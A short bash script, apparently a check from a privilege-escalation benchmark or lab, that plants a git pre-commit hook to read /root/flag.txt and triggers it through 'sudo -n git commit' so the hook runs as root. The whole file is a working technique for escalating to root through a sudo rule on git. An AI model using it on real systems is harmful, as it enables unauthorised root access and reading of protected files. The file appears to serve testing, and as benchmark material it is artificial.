#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat > /opt/bench/repo/.git/hooks/pre-commit <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt
EOF
chmod +x /opt/bench/repo/.git/hooks/pre-commit
sudo -n git -C /opt/bench/repo commit --allow-empty -m bench 2>&1
')"
assert_root_output "${out}"
